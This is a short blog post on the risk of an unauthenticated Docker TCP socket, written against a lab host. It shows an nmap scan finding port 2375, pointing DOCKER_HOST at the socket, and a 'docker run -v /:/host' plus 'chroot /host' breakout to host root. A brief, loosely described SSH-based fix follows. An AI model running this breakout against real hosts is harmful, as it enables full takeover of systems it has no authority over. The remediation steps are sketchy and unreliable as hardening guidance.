---
layout: post
title: 'Securely Accessing Remote Docker Host'
date: '2021-08-16'
description: 'The Docker TCP socket by default doesnt support any authentication. and, if the Docker socket is exposed on an external interface, anyone can connect to it and issue docker commands. This can even lead to host takeover if the Docker daemon is running as root.'
coverimage: Securely_Accessing_Remote_Docker_Host_HjjWMVv.jpg
tags: docker
published: true
posttype: article
categories: article
---
Docker is running out box without the socket set
```
evilsaint@marvel.lab:~# docker ps
Cannot connect to the Docker daemon at unix:///var/run/docker.sock. Is the docker daemon running?

evilsaint@marvel.lab:~# docker images
Cannot connect to the Docker daemon at unix:///var/run/docker.sock. Is the docker daemon running?
```


Nmap Scan showing exposed Docker API port. 
```
nmap -sSV -p- 192.190.96.3
Starting Nmap 7.91 ( https://nmap.org ) at 2021-08-17 00:34 IST
Nmap scan report for docker-host (192.190.96.3)
Host is up (0.000015s latency).
Not shown: 65532 closed ports
PORT     STATE SERVICE    VERSION
22/tcp   open  ssh        OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
2375/tcp open  docker     Docker 19.03.1 (API 1.40)
2376/tcp open  tcpwrapped
MAC Address: 02:42:C0:BE:60:03 (Unknown)
Service Info: OSs: Linux, linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 9.11 seconds
````


Define the DOCKER_HOST environment variable to point to this remote TCP socket.
```
export DOCKER_HOST=192.190.96.3:2375
```

Now we can mount the image to the host volume and do a host breakout if permissions are in place
```
evilsaint@marvel.lab:~# docker run -it -v /:/host ubuntu:18.04 bash
root@6a01ea2ace07:/# chroot /host
#
```

## How can we secure this 

I will SSH into the remote host to perform the fix 

Let us kill the docker
```
ps -ef | grep docker
```

```
kill <pid>
```

Restart the docker service
```
service docker start
```

Now we export the docker host to be accessible over SSH
```
root@localhost:~# export DOCKER_HOST=ssh://root@192.190.96.3
```